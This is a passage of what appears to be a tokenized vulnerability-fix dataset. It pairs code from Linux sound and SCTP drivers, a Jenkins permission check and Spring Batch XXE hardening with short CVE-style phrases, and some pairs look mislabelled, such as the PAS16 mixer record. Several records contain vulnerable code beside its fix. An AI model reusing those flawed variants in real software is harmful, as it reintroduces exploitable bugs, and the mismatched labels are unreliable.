"(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x01", ",", "0x00", ")", ";", "break", ";", "case", "SOUND_MIXER_RECLEV", ":", "/", "*", "Recording", "level", "(", "0", "-", "15", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "15", ",", "0x02", ",", "0", ")", ";", "break", ";", "case", "SOUND_MIXER_RECSRC", ":", "devmask", "=", "level", "&", "POSSIBLE_RECORDING_DEVICES", ";", "changed", "=", "devmask", "^", "rec_devices", ";", "rec_devices", "=", "devmask", ";", "for", "(", "i", "=", "0", ";", "i", "<", "SOUND_MIXER_NRDEVICES", ";", "i", "+", "+)", "if", "(", "changed", "&", "(", "1", "<", "<", "i", ")", ")", "{", "pas_mixer_set", "(", "i", ",", "levels", "[", "i", "]", ");", "}", "return", "rec_devices", ";", "break", ";", "default", ":", "return", "-", "EINVAL", ";", "}", "return", "(", "levels", "[", "whichDev", "]", ");", "}", "/", "**", "**", "*/", "static", "void", "pas_mixer_reset", "(", "void", ")", "{", "int", "foo", ";", "for", "(", "foo", "=", "0", ";", "foo", "<", "SOUND_MIXER_NRDEVICES", ";", "foo", "+", "+)", "pas_mixer_set", "(", "foo", ",", "levels", "[", "foo", "]", ");", "set_mode", "(", "0x04", "|", "0x01", ")", ";", "}", "static", "int", "pas_mixer_ioctl", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "int", "level", ",", "v", ";", "int", "__user", "*", "p", "=", "(", "int", "__user", "*", ")", "arg", ";", "if", "(", "cmd", "=", "=", "SOUND_MIXER_PRIVATE1", ")", "{", "/", "*", "Set", "loudness", "bit", "*", "/", "if", "(", "get_user", "(", "level", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "level", "=", "=", "-", "1", ")", "/", "*", "Return", "current", "settings", "*", "/", "level", "=", "(", "mode_control", "&", "0x04", ")", ";", "else", "{", "mode_control", "&", "=", "~", "0x04", ";", "if", "(", "level", ")", "mode_control", "|", "=", "0x04", ";", "set_mode", "(", "mode_control", ")", ";", "}", "level", "=", "!", "!", "level", ";", "return", "put_user", "(", "level", ",", "p", ")", ";", "}", "if", "(", "cmd", "=", "=", "SOUND_MIXER_PRIVATE2", ")", "{", "/", "*", "Set", "enhance", "bit", "*", "/", "if", "(", "get_user", "(", "level", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "level", "=", "=", "-", "1", ")", "{", "/", "*", "Return", "current", "settings", "*", "/", "if", "(", "!(", "mode_control", "&", "0x03", ")", ")", "level", "=", "0", ";", "else", "level", "=", "(", "(", "mode_control", "&", "0x03", ")", "+", "1", ")", "*", "20", ";", "}", "else", "{", "int", "i", "=", "0", ";", "level", "&", "=", "0x7f", ";", "if", "(", "level", ")", "i", "=", "(", "level", "/", "20", ")", "-", "1", ";", "mode_control", "&", "=", "~", "0x03", ";", "mode_control", "|", "=", "i", "&", "0x03", ";", "set_mode", "(", "mode_control", ")", ";", "if", "(", "i", ")", "i", "=", "(", "i", "+", "1", ")", "*", "20", ";", "level", "=", "i", ";", "}", "return", "put_user", "(", "level", ",", "p", ")", ";", "}", "if", "(", "cmd", "=", "=", "SOUND_MIXER_PRIVATE3", ")", "{", "/", "*", "Set", "mute", "bit", "*", "/", "if", "(", "get_user", "(", "level", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "level", "=", "=", "-", "1", ")", "/", "*", "Return", "current", "settings", "*", "/", "level", "=", "!", "(", "pas_read", "(", "0x0B8A", ")", "&", "0x20", ")", ";", "else", "{", "if", "(", "level", ")", "pas_write", "(", "pas_read", "(", "0x0B8A", ")", "&", "(", "~", "0x20", ")", ",", "0x0B8A", ")", ";", "else", "pas_write", "(", "pas_read", "(", "0x0B8A", ")", "|", "0x20", ",", "0x0B8A", ")", ";", "level", "=", "!", "(", "pas_read", "(", "0x0B8A", ")", "&", "0x20", ")", ";", "}", "return", "put_user", "(", "level", ",", "p", ")", ";", "}", "if", "(", "((", "cmd", ">", ">", "8", ")", "&", "0xff", ")", "=", "=", "'", "M", "'", ")", "{", "if", "(", "get_user", "(", "v", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "_SIOC_DIR", "(", "cmd", ")", "&", "_SIOC_WRITE", ")", "{", "v", "=", "pas_mixer_set", "(", "cmd", "&", "0xff", ",", "v", ")", ";", "}", "else", "{", "switch", "(", "cmd", "&", "0xff", ")", "{", "case", "SOUND_MIXER_RECSRC", ":", "v", "=", "rec_devices", ";", "break", ";", "case", "SOUND_MIXER_STEREODEVS", ":", "v", "=", "SUPPORTED_MIXER_DEVICES", "&", "~", "(", "SOUND_MASK_BASS", "|", "SOUND_MASK_TREBLE", ")", ";", "break", ";", "case", "SOUND_MIXER_DEVMASK", ":", "v", "=", "SUPPORTED_MIXER_DEVICES", ";", "break", ";", "case", "SOUND_MIXER_RECMASK", ":", "v", "=", "POSSIBLE_RECORDING_DEVICES", "&", "SUPPORTED_MIXER_DEVICES", ";", "break", ";", "case", "SOUND_MIXER_CAPS", ":", "v", "=", "0", ";", "/", "*", "No", "special", "capabilities", "*", "/", "break", ";", "default", ":", "v", "=", "levels", "[", "cmd", "&", "0xff", "]", ";", "break", ";", "}", "}", "return", "put_user", "(", "v", ",", "p", ")", ";", "}", "return", "-", "EINVAL", ";", "}", "static", "struct", "mixer_operations", "pas_mixer_operations", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "id", "=", "\"", "PAS16", "\"", ",", ".", "name", "=", "\"", "Pro", "Audio", "Spectrum", "16", "\"", ",", ".", "ioctl", "=", "pas_mixer_ioctl", "}", ";", "int", "__init", "pas_init_mixer", "(", "void", ")", "{", "int", "d", ";", "levels", "=", "load_mixer_volumes", "(", "\"", "PAS16_1", "\"", ",", "default_levels", ",", "1", ")", ";", "pas_mixer_reset", "(", ");", "if", "(", "(", "d", "=", "sound_alloc_mixerdev", "(", "))", "!", "=", "-", "1", ")", "{", "audio_devs", "[", "pas_audiodev", "]", "->", "mixer_dev", "=", "d", ";", "mixer_devs", "[", "d", "]", "=", "&", "pas_mixer_operations", ";", "}", "return", "1", ";", "}"], "docstring_tokens": ["by", "changing", "the", "value", "of", "a", "message", "queue", "head", "pointer", "between", "two", "kernel", "reads", "of", "that", "value"]}
{"contents": ["empty"], "code_tokens": ["chunksize", "=", "sizeof", "(", "init", ")", "+", "addrs_len", ";", "chunksize", "+", "=", "WORD_ROUND", "(", "SCTP_SAT_LEN", "(", "num_types", ")", ");", "chunksize", "+", "=", "WORD_ROUND", "(", "ntohs", "(", "auth_hmacs", "-", ">", "length", ")", ");", "chunksize", "+", "=", "WORD_ROUND", "(", "ntohs", "(", "auth_chunks", "-", ">", "length", ")", ");", "chunksize", "+", "=", "WORD_ROUND", "(", "sizeof", "(", "sctp_supported_ext_param_t", ")", "num_ext", ")", ";", "chunksize", "+", "=", "WORD_ROUND", "(", "ntohs", "(", "auth_hmacs", "-", ">", "length", ")", ");", "chunksize", "+", "=", "WORD_ROUND", "(", "ntohs", "(", "auth_chunks", "-", ">", "length", ")", ");", "chunksize", "+", "=", "WORD_ROUND", "(", "sizeof", "(", "sctp_supported_ext_param_t", ")", "num_ext", ")", ";</s>chunksize", "=", "sizeof", "(", "init", ")", "+", "addrs_len", "+", "SCTP_SAT_LEN", "(", "num_types", ")", ";", "chunksize", "+", "=", "ntohs", "(", "auth_hmacs", "-", ">", "length", ")", ";", "chunksize", "+", "=", "ntohs", "(", "auth_chunks", "-", ">", "length", ")", ";", "chunksize", "+", "=", "sizeof", "(", "sctp_supported_ext_param_t", ")", "+", "num_ext", ";", "chunksize", "+", "=", "ntohs", "(", "auth_hmacs", "-", ">", "length", ")", ";", "chunksize", "+", "=", "ntohs", "(", "auth_chunks", "-", ">", "length", ")", ";", "chunksize", "+", "=", "sizeof", "(", "sctp_supported_ext_param_t", ")", "+", "num_ext", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "packet"]}
{"contents": ["empty"], "code_tokens": ["import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "@", "RequirePOST", "Jenkins", "jenkins", "=", "Jenkins", ".", "getInstance", "(", ");", "if", "(", "jenkins", "=", "=", "null", "|", "|", "!", "jenkins", ".", "hasPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ")", "{", "return", "FormValidation", ".", "ok", "(", ");", "}</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "@", "RequirePOST", "Jenkins", ".", "getInstance", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "<", "f", ":", "textbox", "checkMethod", "=", "\"", "post", "\"", "/>", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "tools", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "HttpMethod", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "InteractivePage", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "WebRequest", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "html", ".", "HtmlPage", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "html", ".", "HtmlTextInput", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "javascript", ".", "JavaScriptEngine", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "javascript", ".", "host", ".", "xml", ".", "XMLHttpRequest", ";", "import", "hudson", ".", "model", ".", "JDK", ";", "import", "hudson", ".", "model", ".", "User", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "net", ".", "sourceforge", ".", "htmlunit", ".", "corejs", ".", "javascript", ".", "Function", ";", "import", "net", ".", "sourceforge", ".", "htmlunit", ".", "corejs", ".", "javascript", ".", "Scriptable", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "rules", ".", "TemporaryFolder", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Issue", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "MockAuthorizationStrategy", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Field", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "net", ".", "URLDecoder", ";", "import", "java", ".", "net", ".", "URLEncoder", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "List", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "containsString", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertThat", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "public", "class", "ZipExtractionInstallerTest", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Rule", "public", "TemporaryFolder", "tmp", "=", "new", "TemporaryFolder", "(", ");", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "794", "\"", ")", "public", "void", "onlyAdminCanReachTheDoCheck", "(", ")", "throws", "Exception", "{", "final", "String", "ADMIN", "=", "\"", "admin", "\"", ";", "final", "String", "USER", "=", "\"", "user", "\"", ";", "j", ".", "jenkins", ".", "setCrumbIssuer", "(", "null", ")", ";", "j", ".", "jenkins", ".", "setSecurityRealm", "(", "j", ".", "createDummySecurityRealm", "(", "))", ";", "j", ".", "jenkins", ".", "setAuthorizationStrategy", "(", "new", "MockAuthorizationStrategy", "(", ")", ".", "grant", "(", "Jenkins", ".", "ADMINISTER", ")", ".", "everywhere", "(", ").", "to", "(", "ADMIN", ")", ".", "grant", "(", "Jenkins", ".", "READ", ")", ".", "everywhere", "(", ").", "to", "(", "USER", ")", ")", ";", "User", ".", "getById", "(", "ADMIN", ",", "true", ")", ";", "User", ".", "getById", "(", "USER", ",", "true", ")", ";", "WebRequest", "request", "=", "new", "WebRequest", "(", "new", "URL", "(", "j", ".", "getURL", "(", ")", "+", "\"", "descriptorByName", "/", "hudson", ".", "tools", ".", "ZipExtractionInstaller", "/", "checkUrl", "\"", "),", "HttpMethod", ".", "POST", ")", ";", "request", ".", "setRequestBody", "(", "URLEncoder", ".", "encode", "(", "\"", "value", "=", "https", ":", "//", "www", ".", "google", ".", "com", "\"", ",", "StandardCharsets", ".", "UTF_8", ".", "name", "(", "))", ");", "JenkinsRule", ".", "WebClient", "adminWc", "=", "j", ".", "createWebClient", "(", ");", "adminWc", ".", "login", "(", "ADMIN", ")", ";", "assertEquals", "(", "200", ",", "adminWc", ".", "getPage", "(", "request", ")", ".", "getWebResponse", "(", ").", "getStatusCode", "(", "))", ";", "JenkinsRule", ".", "WebClient", "userWc", "=", "j", ".", "createWebClient", "(", ");", "userWc", ".", "getOptions", "(", ").", "setThrowExceptionOnFailingStatusCode", "(", "false", ")", ";", "userWc", ".", "login", "(", "USER", ")", ";", "assertEquals", "(", "403", ",", "userWc", ".", "getPage", "(", "request", ")", ".", "getWebResponse", "(", ").", "getStatusCode", "(", "))", ";", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "794", "\"", ")", "public", "void", "roundtrip", "(", ")", "throws", "Exception", "{", "final", "String", "VALID_URL", "=", "\"", "https", ":", "//", "www", ".", "google", ".", "com", "\"", ";", "final", "String", "INVALID_URL", "=", "\"", "only", "-", "crappy", "-", "letters", "\"", ";", "ZipExtractionInstaller", "installer", "=", "new", "ZipExtractionInstaller", "(", "\"\"", ",", "VALID_URL", ",", "\"", "\")", ";", "j", ".", "jenkins", ".", "getJDKs", "(", ").", "add", "(", "new", "JDK", "(", "\"", "test", "\"", ",", "tmp", ".", "getRoot", "(", ").", "getAbsolutePath", "(", "),", "Arrays", ".", "asList", "(", "new", "InstallSourceProperty", "(", "Arrays", ".", "<", "ToolInstaller", ">", "asList", "(", "installer", ")", "))", "))", ";", "JenkinsRule", ".", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ");", "SpyingJavaScriptEngine", "jsEngine", "=", "new", "SpyingJavaScriptEngine", "(", "wc", ",", "\"", "ZipExtractionInstaller", "/", "checkUrl", "\"", ",", "HttpMethod", ".", "POST", ")", ";", "wc", ".", "setJavaScriptEngine", "(", "jsEngine", ")", ";", "HtmlPage", "page", "=", "wc", ".", "goTo", "(", "\"", "configureTools", "\"", ");", "XMLHttpRequest", "lastRequest", "=", "jsEngine", ".", "getLastRequest", "(", ");", "String", "body", "=", "URLDecoder", ".", "decode", "(", "getPrivateWebRequestField", "(", "lastRequest", ")", ".", "getRequestBody", "(", "),", "\"", "UTF", "-", "8", "\"", ");", "assertThat", "(", "body", ",", "containsString", "(", "VALID_URL", ")", ");", "assertEquals", "(", "FormValidation", ".", "ok", "(", ").", "renderHtml", "(", "),", "lastRequest", ".", "getResponseText", "(", "))", ";", "HtmlTextInput", "urlInput", "=", "page", ".", "getDocumentElement", "(", ").", "getOneHtmlElementByAttribute", "(", "\"", "input", "\"", ",", "\"", "value", "\"", ",", "VALID_URL", ")", ";", "urlInput", ".", "setAttribute", "(", "\"", "value", "\"", ",", "INVALID_URL", ")", ";", "j", ".", "submit", "(", "page", ".", "getFormByName", "(", "\"", "config", "\"", "))", ";", "JDK", "jdk", "=", "j", ".", "jenkins", ".", "getJDK", "(", "\"", "test", "\"", ");", "InstallSourceProperty", "isp", "=", "jdk", ".", "getProperties", "(", ").", "get", "(", "InstallSourceProperty", ".", "class", ")", ";", "assertEquals", "(", "1", ",", "isp", ".", "installers", ".", "size", "(", "))", ";", "assertEquals", "(", "INVALID_URL", ",", "isp", ".", "installers", ".", "get", "(", "ZipExtractionInstaller", ".", "class", ")", ".", "getUrl", "(", "))", ";", "wc", ".", "goTo", "(", "\"", "configureTools", "\"", ");", "lastRequest", "=", "jsEngine", ".", "getLastRequest", "(", ");", "body", "=", "URLDecoder", ".", "decode", "(", "getPrivateWebRequestField", "(", "lastRequest", ")", ".", "getRequestBody", "(", "),", "\"", "UTF", "-", "8", "\"", ");", "assertThat", "(", "body", ",", "containsString", "(", "INVALID_URL", ")", ");", "assertThat", "(", "lastRequest", ".", "getResponseText", "(", "),", "containsString", "(", "Messages", ".", "ZipExtractionInstaller_malformed_url", "(", "))", ");", "}", "private", "class", "SpyingJavaScriptEngine", "extends", "JavaScriptEngine", "{", "private", "List", "<", "XMLHttpRequest", ">", "storedRequests", "=", "new", "ArrayList", "<", ">(", ");", "private", "String", "urlToMatch", ";", "private", "HttpMethod", "method", ";", "SpyingJavaScriptEngine", "(", "JenkinsRule", ".", "WebClient", "wc", ",", "@", "Nullable", "String", "urlToMatch", ",", "@", "Nullable", "HttpMethod", "method", ")", "{", "super", "(", "wc", ")", ";", "this", ".", "urlToMatch", "=", "urlToMatch", ";", "this", ".", "method", "=", "method", ";", "}", "@", "Override", "public", "Object", "callFunction", "(", "InteractivePage", "page", ",", "Function", "function", ",", "Scriptable", "scope", ",", "Scriptable", "thisObject", ",", "Object", "[", "]", "args", ")", "{", "if", "(", "thisObject", "instanceof", "XMLHttpRequest", ")", "{", "try", "{", "WebRequest", "request", "=", "getPrivateWebRequestField", "(", "(", "XMLHttpRequest", ")", "thisObject", ")", ";", "boolean", "correctUrl", "=", "urlToMatch", "=", "=", "null", "|", "|", "request", ".", "getUrl", "(", ").", "toString", "(", ").", "contains", "(", "urlToMatch", ")", ";", "boolean", "correctMethod", "=", "method", "=", "=", "null", "|", "|", "request", ".", "getHttpMethod", "(", ").", "equals", "(", "method", ")", ";", "if", "(", "correctUrl", "&", "&", "correctMethod", ")", "{", "if", "(", "((", "XMLHttpRequest", ")", "thisObject", ")", ".", "getReadyState", "(", ")", "=", "=", "4", ")", "{", "storedRequests", ".", "add", "(", "(", "XMLHttpRequest", ")", "thisObject", ")", ";", "}", "}", "}", "catch", "(", "NoSuchFieldException", "|", "IllegalAccessException", "e", ")", "{", "e", ".", "printStackTrace", "(", ");", "}", "}", "return", "super", ".", "callFunction", "(", "page", ",", "function", ",", "scope", ",", "thisObject", ",", "args", ")", ";", "}", "@", "Nonnull", "public", "XMLHttpRequest", "getLastRequest", "(", ")", "{", "if", "(", "storedRequests", ".", "isEmpty", "(", "))", "{", "fail", "(", "\"", "There", "is", "no", "available", "requests", "for", "the", "proposed", "url", "/", "method", "\"", ");", "}", "return", "storedRequests", ".", "get", "(", "storedRequests", ".", "size", "(", ")", "-", "1", ")", ";", "}", "}", "private", "static", "WebRequest", "getPrivateWebRequestField", "(", "XMLHttpRequest", "xmlHttpRequest", ")", "throws", "NoSuchFieldException", ",", "IllegalAccessException", "{", "Field", "webRequest_Field", "=", "XMLHttpRequest", ".", "class", ".", "getDeclaredField", "(", "\"", "webRequest_", "\"", ");", "webRequest_Field", ".", "setAccessible", "(", "true", ")", ";", "return", "(", "WebRequest", ")", "webRequest_Field", ".", "get", "(", "xmlHttpRequest", ")", ";", "}", "}</s><", "f", ":", "textbox", "/", ">"], "docstring_tokens": ["using", "a", "specially-crafted", "argument"]}
{"contents": ["empty"], "code_tokens": ["u16", "head", ",", "tail", ",", "size", ";", "head", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "tail", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wTail", ")", ";", "size", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wSize", ")", ";", "if", "(", "head", ">", "size", "|", "|", "tail", ">", "size", ")", "goto", "out", ";", "while", "(", "head", "!", "=", "tail", ")", "{", "unsigned", "char", "val", "=", "readw", "(", "pwMIDQData", "+", "2", "*", "head", ")", ";", "if", "(", "test_bit", "(", "MSNDMIDI_MODE_BIT_INPUT_TRIGGER", ",", "&", "mpu", "-", ">", "mode", ")", ")", "snd_rawmidi_receive", "(", "mpu", "-", ">", "substream_input", ",", "&", "val", ",", "1", ")", ";", "if", "(", "++", "head", ">", "size", ")", "head", "=", "0", ";", "writew", "(", "head", ",", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "out", ":", "u16", "head", ",", "tail", ",", "size", ";", "head", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";", "tail", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wTail", ")", ";", "size", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wSize", ")", ";", "if", "(", "head", ">", "size", "|", "|", "tail", ">", "size", ")", "goto", "out", ";", "while", "(", "head", "!", "=", "tail", ")", "{", "snd_msnd_eval_dsp_msg", "(", "chip", ",", "readw", "(", "pwDSPQData", "+", "2", "*", "head", ")", ");", "if", "(", "++", "head", ">", "size", ")", "head", "=", "0", ";", "writew", "(", "head", ",", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";", "out", ":</s>while", "(", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wTail", ")", "!", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ")", "{", "u16", "wTmp", ",", "val", ";", "val", "=", "readw", "(", "pwMIDQData", "+", "2", "*", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ");", "if", "(", "test_bit", "(", "MSNDMIDI_MODE_BIT_INPUT_TRIGGER", ",", "&", "mpu", "-", ">", "mode", ")", ")", "snd_rawmidi_receive", "(", "mpu", "-", ">", "substream_input", ",", "(", "unsigned", "char", "*", ")&", "val", ",", "1", ")", ";", "wTmp", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", "+", "1", ";", "if", "(", "wTmp", ">", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wSize", ")", ")", "writew", "(", "0", ",", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "else", "writew", "(", "wTmp", ",", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "while", "(", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wTail", ")", "!", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ")", "{", "u16", "wTmp", ";", "snd_msnd_eval_dsp_msg", "(", "chip", ",", "readw", "(", "pwDSPQData", "+", "2", "*", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", "))", ";", "wTmp", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", "+", "1", ";", "if", "(", "wTmp", ">", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wSize", ")", ")", "writew", "(", "0", ",", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";", "else", "writew", "(", "wTmp", ",", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";"], "docstring_tokens": ["by", "changing", "the", "value", "of", "a", "message", "queue", "head", "pointer", "between", "two", "kernel", "reads", "of", "that", "value"]}
{"contents": ["empty"], "code_tokens": ["*", "Copyright", "2010", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "transformerFactory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "transformerFactory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_STYLESHEET", ",", "\"", "\")", ";", "Transformer", "transformer", "=", "transformerFactory", ".", "newTransformer", "(", ");", "*", "Copyright", "2006", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "@", "author", "Mahmoud", "Ben", "Hassine", "private", "XMLInputFactory", "xmlInputFactory", "=", "StaxUtils", ".", "createXmlInputFactory", "(", ");", "/", "**", "*", "Set", "the", "{", "@", "link", "XMLInputFactory", "}", ".", "*", "@", "param", "xmlInputFactory", "to", "use", "*", "/", "public", "void", "setXmlInputFactory", "(", "XMLInputFactory", "xmlInputFactory", ")", "{", "Assert", ".", "notNull", "(", "xmlInputFactory", ",", "\"", "XMLInputFactory", "must", "not", "be", "null", "\"", ");", "this", ".", "xmlInputFactory", "=", "xmlInputFactory", ";", "}", "eventReader", "=", "xmlInputFactory", ".", "createXMLEventReader", "(", "inputStream", ")", ";", "*", "Copyright", "2006", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "*", "@", "author", "Mahmoud", "Ben", "Hassine", "public", "static", "XMLInputFactory", "createXmlInputFactory", "(", ")", "{", "XMLInputFactory", "xmlInputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "xmlInputFactory", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "false", ")", ";", "xmlInputFactory", ".", "setProperty", "(", "XMLInputFactory", ".", "IS_SUPPORTING_EXTERNAL_ENTITIES", ",", "false", ")", ";", "return", "xmlInputFactory", ";", "}", "*", "Copyright", "2017", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "import", "org", ".", "springframework", ".", "batch", ".", "item", ".", "xml", ".", "StaxUtils", ";", "private", "XMLInputFactory", "xmlInputFactory", "=", "StaxUtils", ".", "createXmlInputFactory", "(", ");", "/", "**", "*", "Set", "the", "{", "@", "link", "XMLInputFactory", "}", ".", "*", "*", "@", "param", "xmlInputFactory", "to", "use", "*", "@", "return", "The", "current", "instance", "of", "the", "builder", "*", "@", "see", "StaxEventItemReader", "#", "setXmlInputFactory", "(", "XMLInputFactory", ")", "*", "/", "public", "StaxEventItemReaderBuilder", "<", "T", ">", "xmlInputFactory", "(", "XMLInputFactory", "xmlInputFactory", ")", "{", "this", ".", "xmlInputFactory", "=", "xmlInputFactory", ";", "return", "this", ";", "}", "reader", ".", "setXmlInputFactory", "(", "this", ".", "xmlInputFactory", ")", ";", "*", "Copyright", "2008", "-", "2019", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "hamcrest", ".", "Matchers", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "java", ".", "io", ".", "File", ";", "*", "@", "author", "Michael", "Minella", "*", "@", "author", "Mahmoud", "Ben", "Hassine", "XMLEventReader", "reader", "=", "StaxUtils", ".", "createXmlInputFactory", "(", ").", "createXMLEventReader", "(", "resource", ".", "getInputStream", "(", "))", ";", "XMLEventReader", "reader", "=", "StaxUtils", ".", "createXmlInputFactory", "(", ").", "createXMLEventReader", "(", "resource", ".", "getInputStream", "(", "))", ";", "XMLEventReader", "reader", "=", "StaxUtils", ".", "createXmlInputFactory", "(", ").", "createXMLEventReader", "(", "resource", ".", "getInputStream", "(", "))", ";", "@", "Test", "public", "void", "testDtdXml", "(", ")", "{", "String", "xmlWithDtd", "=", "\"", "<?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"", "encoding", "=", "\\\"", "utf", "-", "8", "\\", "\"?", ">\\", "n", "<", "!", "DOCTYPE", "rohit", "[", 